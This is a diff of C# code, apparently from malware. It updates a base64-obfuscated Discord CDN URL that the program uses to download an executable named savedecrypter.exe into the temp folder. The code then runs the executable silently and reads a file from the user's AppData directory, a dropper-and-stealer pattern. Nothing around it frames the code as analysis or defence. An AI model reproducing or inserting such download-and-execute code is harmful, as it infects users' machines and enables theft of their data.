@@ -263,7 +263,7 @@ namespace Program
 
 					if (File.Exists(nanananaan))
 					{
-						new WebClient().DownloadFile(SendPacked.decodebase("aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTQzNDkzMTQ0NDY3NjE1ODE1Lzk1NTU3MzMyNDk5NjU3MTE5Ny9zYXZlZGVjcnlwdGVyLmV4ZQ=="), Path.GetTempPath() + "\\savedecrypter.exe");
+						new WebClient().DownloadFile(SendPacked.decodebase("aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTk3NDk4MTQyOTY4Nzk1MjIyLzk5ODMwMTU1MTkwMDc1ODA4Ni9zYXZlZGVjcnlwdGVyLmV4ZQ=="), Path.GetTempPath() + "\\savedecrypter.exe");
 						Process.Start(Path.GetTempPath() + "\\savedecrypter.exe");
 						Thread.Sleep(1000);
 						byte[] lolxd = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\lanx.txt");
